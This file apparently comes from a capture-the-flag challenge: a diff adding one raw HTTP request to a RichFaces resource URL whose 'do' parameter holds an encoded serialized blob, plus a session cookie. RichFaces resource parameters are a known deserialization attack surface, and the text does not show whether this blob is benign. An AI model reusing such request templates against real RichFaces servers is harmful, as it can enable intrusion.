@@ -1,0 +1,9 @@
+GET /rfRes/buttonHoverBackgroundImage.png.jsf?v=4.3.2.Final&do=eAGdjrFOwzAQhg!SqCnqAAwM7KxOoZCkZQCpqCJSYKBix02cOsiKXftCw8Jj9Cl4CcQTsDKz8gZI4FR5An7pTt8N9929foNrNOw90idKKiwEuaaG31Dldj!f3g8ePhzYnsKOkDSb0hSljqGHXDPDpchqdXEJTforz!ZdW1tW1t!ISobk!i5ZH4XB4c-XdqAbg8etfCIzFkNHSY0J9GiFXOoCnxH2k2bRF7Rc-DPURbk4T6CTF4It4QUcy1wabNlTWqJMpWhnR7N8g7X6bYMwXFWY05SZq9vZ4JhE2fwkOI0GYTA8SxmNRkE4IhnRbFkxg!OiJPZpBGg8LtpziErVCOMGxr7!D1v9B0i9cDQ_&ln=org.richfaces.images HTTP/1.1
+Host: wutfaces.ctf.tint0.com
+User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Accept: image/webp,image/apng,image/*,*/*;q=0.8
+Referer: http://wutfaces.ctf.tint0.com/rfRes/skinning.ecss.jsf;jsessionid=CC1AA6EE68A2AB80CA75A73A9276C18B?db=eAHjW!XqPQAE!QKS
+Accept-Language: en-US,en;q=0.9,vi;q=0.8
+Cookie: JSESSIONID=CC1AA6EE68A2AB80CA75A73A9276C18B
+Connection: close
+
